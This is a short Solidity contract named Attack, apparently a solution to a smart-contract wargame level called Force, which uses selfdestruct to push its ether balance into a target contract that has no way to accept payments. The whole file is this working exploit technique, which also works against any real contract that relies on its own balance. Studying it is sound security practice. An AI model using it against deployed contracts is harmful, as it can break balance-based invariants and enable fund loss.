// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Force} from "./Force.sol";

contract Attack {
    Force private force;

    constructor(address _force) {
        force = Force(_force);
    }

    receive() external payable {}

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function attack() external {
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
}
